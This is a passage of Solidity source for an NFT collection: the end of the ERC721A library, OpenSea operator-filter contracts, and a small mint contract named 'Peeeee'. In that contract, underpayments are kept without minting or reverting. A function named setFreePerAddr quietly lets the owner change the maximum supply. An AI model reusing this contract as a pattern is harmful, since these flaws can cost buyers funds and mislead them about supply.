1049             // Updates:
1050             // - `address` to the owner.
1051             // - `startTimestamp` to the timestamp of minting.
1052             // - `burned` to `false`.
1053             // - `nextInitialized` to `quantity == 1`.
1054             _packedOwnerships[startTokenId] = _packOwnershipData(
1055                 to,
1056                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1057             );
1058 
1059             uint256 toMasked;
1060             uint256 end = startTokenId + quantity;
1061 
1062             // Use assembly to loop and emit the `Transfer` event for gas savings.
1063             // The duplicated `log4` removes an extra check and reduces stack juggling.
1064             // The assembly, together with the surrounding Solidity code, have been
1065             // delicately arranged to nudge the compiler into producing optimized opcodes.
1066             assembly {
1067                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1068                 toMasked := and(to, _BITMASK_ADDRESS)
1069                 // Emit the `Transfer` event.
1070                 log4(
1071                     0, // Start of data (0, since no data).
1072                     0, // End of data (0, since no data).
1073                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1074                     0, // `address(0)`.
1075                     toMasked, // `to`.
1076                     startTokenId // `tokenId`.
1077                 )
1078 
1079                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1080                 // that overflows uint256 will make the loop run out of gas.
1081                 // The compiler will optimize the `iszero` away for performance.
1082                 for {
1083                     let tokenId := add(startTokenId, 1)
1084                 } iszero(eq(tokenId, end)) {
1085                     tokenId := add(tokenId, 1)
1086                 } {
1087                     // Emit the `Transfer` event. Similar to above.
1088                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1089                 }
1090             }
1091             if (toMasked == 0) revert MintToZeroAddress();
1092 
1093             _currentIndex = end;
1094         }
1095         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1096     }
1097 
1098     /**
1099      * @dev Mints `quantity` tokens and transfers them to `to`.
1100      *
1101      * This function is intended for efficient minting only during contract creation.
1102      *
1103      * It emits only one {ConsecutiveTransfer} as defined in
1104      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1105      * instead of a sequence of {Transfer} event(s).
1106      *
1107      * Calling this function outside of contract creation WILL make your contract
1108      * non-compliant with the ERC721 standard.
1109      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1110      * {ConsecutiveTransfer} event is only permissible during contract creation.
1111      *
1112      * Requirements:
1113      *
1114      * - `to` cannot be the zero address.
1115      * - `quantity` must be greater than 0.
1116      *
1117      * Emits a {ConsecutiveTransfer} event.
1118      */
1119     function _mintERC2309(address to, uint256 quantity) internal virtual {
1120         uint256 startTokenId = _currentIndex;
1121         if (to == address(0)) revert MintToZeroAddress();
1122         if (quantity == 0) revert MintZeroQuantity();
1123         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1124 
1125         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1126 
1127         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1128         unchecked {
1129             // Updates:
1130             // - `balance += quantity`.
1131             // - `numberMinted += quantity`.
1132             //
1133             // We can directly add to the `balance` and `numberMinted`.
1134             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1135 
1136             // Updates:
1137             // - `address` to the owner.
1138             // - `startTimestamp` to the timestamp of minting.
1139             // - `burned` to `false`.
1140             // - `nextInitialized` to `quantity == 1`.
1141             _packedOwnerships[startTokenId] = _packOwnershipData(
1142                 to,
1143                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1144             );
1145 
1146             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1147 
1148             _currentIndex = startTokenId + quantity;
1149         }
1150         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1151     }
1152 
1153     /**
1154      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1155      *
1156      * Requirements:
1157      *
1158      * - If `to` refers to a smart contract, it must implement
1159      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1160      * - `quantity` must be greater than 0.
1161      *
1162      * See {_mint}.
1163      *
1164      * Emits a {Transfer} event for each mint.
1165      */
1166     function _safeMint(
1167         address to,
1168         uint256 quantity,
1169         bytes memory _data
1170     ) internal virtual {
1171         _mint(to, quantity);
1172 
1173         unchecked {
1174             if (to.code.length != 0) {
1175                 uint256 end = _currentIndex;
1176                 uint256 index = end - quantity;
1177                 do {
1178                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1179                         revert TransferToNonERC721ReceiverImplementer();
1180                     }
1181                 } while (index < end);
1182                 // Reentrancy protection.
1183                 if (_currentIndex != end) revert();
1184             }
1185         }
1186     }
1187 
1188     /**
1189      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1190      */
1191     function _safeMint(address to, uint256 quantity) internal virtual {
1192         _safeMint(to, quantity, '');
1193     }
1194 
1195     // =============================================================
1196     //                        BURN OPERATIONS
1197     // =============================================================
1198 
1199     /**
1200      * @dev Equivalent to `_burn(tokenId, false)`.
1201      */
1202     function _burn(uint256 tokenId) internal virtual {
1203         _burn(tokenId, false);
1204     }
1205 
1206     /**
1207      * @dev Destroys `tokenId`.
1208      * The approval is cleared when the token is burned.
1209      *
1210      * Requirements:
1211      *
1212      * - `tokenId` must exist.
1213      *
1214      * Emits a {Transfer} event.
1215      */
1216     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1217         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1218 
1219         address from = address(uint160(prevOwnershipPacked));
1220 
1221         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1222 
1223         if (approvalCheck) {
1224             // The nested ifs save around 20+ gas over a compound boolean condition.
1225             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1226                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1227         }
1228 
1229         _beforeTokenTransfers(from, address(0), tokenId, 1);
1230 
1231         // Clear approvals from the previous owner.
1232         assembly {
1233             if approvedAddress {
1234                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1235                 sstore(approvedAddressSlot, 0)
1236             }
1237         }
1238 
1239         // Underflow of the sender's balance is impossible because we check for
1240         // ownership above and the recipient's balance can't realistically overflow.
1241         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1242         unchecked {
1243             // Updates:
1244             // - `balance -= 1`.
1245             // - `numberBurned += 1`.
1246             //
1247             // We can directly decrement the balance, and increment the number burned.
1248             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1249             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1250 
1251             // Updates:
1252             // - `address` to the last owner.
1253             // - `startTimestamp` to the timestamp of burning.
1254             // - `burned` to `true`.
1255             // - `nextInitialized` to `true`.
1256             _packedOwnerships[tokenId] = _packOwnershipData(
1257                 from,
1258                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1259             );
1260 
1261             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1262             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1263                 uint256 nextTokenId = tokenId + 1;
1264                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1265                 if (_packedOwnerships[nextTokenId] == 0) {
1266                     // If the next slot is within bounds.
1267                     if (nextTokenId != _currentIndex) {
1268                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1269                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1270                     }
1271                 }
1272             }
1273         }
1274 
1275         emit Transfer(from, address(0), tokenId);
1276         _afterTokenTransfers(from, address(0), tokenId, 1);
1277 
1278         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1279         unchecked {
1280             _burnCounter++;
1281         }
1282     }
1283 
1284     // =============================================================
1285     //                     EXTRA DATA OPERATIONS
1286     // =============================================================
1287 
1288     /**
1289      * @dev Directly sets the extra data for the ownership data `index`.
1290      */
1291     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1292         uint256 packed = _packedOwnerships[index];
1293         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1294         uint256 extraDataCasted;
1295         // Cast `extraData` with assembly to avoid redundant masking.
1296         assembly {
1297             extraDataCasted := extraData
1298         }
1299         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1300         _packedOwnerships[index] = packed;
1301     }
1302 
1303     /**
1304      * @dev Called during each token transfer to set the 24bit `extraData` field.
1305      * Intended to be overridden by the cosumer contract.
1306      *
1307      * `previousExtraData` - the value of `extraData` before transfer.
1308      *
1309      * Calling conditions:
1310      *
1311      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1312      * transferred to `to`.
1313      * - When `from` is zero, `tokenId` will be minted for `to`.
1314      * - When `to` is zero, `tokenId` will be burned by `from`.
1315      * - `from` and `to` are never both zero.
1316      */
1317     function _extraData(
1318         address from,
1319         address to,
1320         uint24 previousExtraData
1321     ) internal view virtual returns (uint24) {}
1322 
1323     /**
1324      * @dev Returns the next extra data for the packed ownership data.
1325      * The returned result is shifted into position.
1326      */
1327     function _nextExtraData(
1328         address from,
1329         address to,
1330         uint256 prevOwnershipPacked
1331     ) private view returns (uint256) {
1332         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1333         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1334     }
1335 
1336     // =============================================================
1337     //                       OTHER OPERATIONS
1338     // =============================================================
1339 
1340     /**
1341      * @dev Returns the message sender (defaults to `msg.sender`).
1342      *
1343      * If you are writing GSN compatible contracts, you need to override this function.
1344      */
1345     function _msgSenderERC721A() internal view virtual returns (address) {
1346         return msg.sender;
1347     }
1348 
1349     /**
1350      * @dev Converts a uint256 to its ASCII string decimal representation.
1351      */
1352     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1353         assembly {
1354             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1355             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1356             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1357             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1358             let m := add(mload(0x40), 0xa0)
1359             // Update the free memory pointer to allocate.
1360             mstore(0x40, m)
1361             // Assign the `str` to the end.
1362             str := sub(m, 0x20)
1363             // Zeroize the slot after the string.
1364             mstore(str, 0)
1365 
1366             // Cache the end of the memory to calculate the length later.
1367             let end := str
1368 
1369             // We write the string from rightmost digit to leftmost digit.
1370             // The following is essentially a do-while loop that also handles the zero case.
1371             // prettier-ignore
1372             for { let temp := value } 1 {} {
1373                 str := sub(str, 1)
1374                 // Write the character to the pointer.
1375                 // The ASCII index of the '0' character is 48.
1376                 mstore8(str, add(48, mod(temp, 10)))
1377                 // Keep dividing `temp` until zero.
1378                 temp := div(temp, 10)
1379                 // prettier-ignore
1380                 if iszero(temp) { break }
1381             }
1382 
1383             let length := sub(end, str)
1384             // Move the pointer 32 bytes leftwards to make room for the length.
1385             str := sub(str, 0x20)
1386             // Store the length.
1387             mstore(str, length)
1388         }
1389     }
1390 }
1391 
1392 
1393 interface IOperatorFilterRegistry {
1394     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1395     function register(address registrant) external;
1396     function registerAndSubscribe(address registrant, address subscription) external;
1397     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1398     function unregister(address addr) external;
1399     function updateOperator(address registrant, address operator, bool filtered) external;
1400     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1401     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1402     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1403     function subscribe(address registrant, address registrantToSubscribe) external;
1404     function unsubscribe(address registrant, bool copyExistingEntries) external;
1405     function subscriptionOf(address addr) external returns (address registrant);
1406     function subscribers(address registrant) external returns (address[] memory);
1407     function subscriberAt(address registrant, uint256 index) external returns (address);
1408     function copyEntriesOf(address registrant, address registrantToCopy) external;
1409     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1410     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1411     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1412     function filteredOperators(address addr) external returns (address[] memory);
1413     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1414     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1415     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1416     function isRegistered(address addr) external returns (bool);
1417     function codeHashOf(address addr) external returns (bytes32);
1418 }
1419 
1420 
1421 /**
1422  * @title  OperatorFilterer
1423  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1424  *         registrant's entries in the OperatorFilterRegistry.
1425  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1426  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1427  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1428  */
1429 abstract contract OperatorFilterer {
1430     error OperatorNotAllowed(address operator);
1431 
1432     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1433         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1434 
1435     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1436         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1437         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1438         // order for the modifier to filter addresses.
1439         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1440             if (subscribe) {
1441                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1442             } else {
1443                 if (subscriptionOrRegistrantToCopy != address(0)) {
1444                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1445                 } else {
1446                     OPERATOR_FILTER_REGISTRY.register(address(this));
1447                 }
1448             }
1449         }
1450     }
1451 
1452     modifier onlyAllowedOperator(address from) virtual {
1453         // Check registry code length to facilitate testing in environments without a deployed registry.
1454         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1455             // Allow spending tokens from addresses with balance
1456             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1457             // from an EOA.
1458             if (from == msg.sender) {
1459                 _;
1460                 return;
1461             }
1462             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1463                 revert OperatorNotAllowed(msg.sender);
1464             }
1465         }
1466         _;
1467     }
1468 
1469     modifier onlyAllowedOperatorApproval(address operator) virtual {
1470         // Check registry code length to facilitate testing in environments without a deployed registry.
1471         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1472             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1473                 revert OperatorNotAllowed(operator);
1474             }
1475         }
1476         _;
1477     }
1478 }
1479 
1480 /**
1481  * @title  DefaultOperatorFilterer
1482  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1483  */
1484 abstract contract TheOperatorFilterer is OperatorFilterer {
1485     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1486 
1487     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1488 }
1489 
1490 
1491 contract Peeeee is ERC721A, TheOperatorFilterer {
1492 
1493     address public owner;
1494 
1495     uint256 public maxSupply = 555;
1496 
1497     uint256 public price = 0.002 ether;
1498 
1499 
1500     mapping(address => uint256) private _userForFree;
1501 
1502     mapping(uint256 => uint256) private _userMinted;
1503 
1504     function mint(uint256 amount) payable public {
1505         require(totalSupply() + amount <= maxSupply);
1506         mintInternal(amount);
1507     }
1508 
1509     function mintInternal(uint256 amount) internal {
1510         if (msg.value == 0) {
1511             if (totalSupply() > maxSupply / 5) {
1512                 require(amount == 1 
1513                     && _userMinted[block.number] < FreeNum() 
1514                     && _userForFree[tx.origin] < 1 );
1515                 _userForFree[tx.origin]++;
1516                 _userMinted[block.number]++;
1517             }
1518             _safeMint(msg.sender, 1);
1519         } else {
1520             if (msg.value >= amount * price)
1521             _safeMint(msg.sender, amount);
1522         }
1523     }
1524 
1525     function teammint(address rec, uint256 amount) public onlyOwner {
1526         require(totalSupply() + amount <= maxSupply);
1527         _safeMint(rec, amount);
1528     }
1529     
1530     modifier onlyOwner {
1531         require(owner == msg.sender);
1532         _;
1533     }
1534 
1535     constructor() ERC721A("peeeeeeeeeeee", "pee") {
1536         owner = msg.sender;
1537     }
1538 
1539     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1540         return string(abi.encodePacked("ipfs://QmXN1fkwjPhfDy5aPEtqW5UnEccX6RL34L1LvVag4yMfZd/", _toString(tokenId), ".json"));
1541     }
1542 
1543     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1544         maxSupply = maxS;
1545     }
1546 
1547     function FreeNum() internal returns (uint256){
1548         return (maxSupply - totalSupply()) / 12;
1549     }
1550 
1551     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1552         uint256 royaltyAmount = (_salePrice * 75) / 1000;
1553         return (owner, royaltyAmount);
1554     }
1555 
1556 
1557     function withdraw() external onlyOwner {
1558         payable(msg.sender).transfer(address(this).balance);
1559     }
1560 
1561     /////////////////////////////
1562     // OPENSEA FILTER REGISTRY 
1563     /////////////////////////////
1564 
1565     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1566         super.setApprovalForAll(operator, approved);
1567     }
1568 
1569     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1570         super.approve(operator, tokenId);
1571     }
1572 
1573     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1574         super.transferFrom(from, to, tokenId);
1575     }
1576 
1577     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1578         super.safeTransferFrom(from, to, tokenId);
1579     }
1580 
1581     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1582         public
1583         payable
1584         override
1585         onlyAllowedOperator(from)
1586     {
1587         super.safeTransferFrom(from, to, tokenId, data);
1588     }
1589 }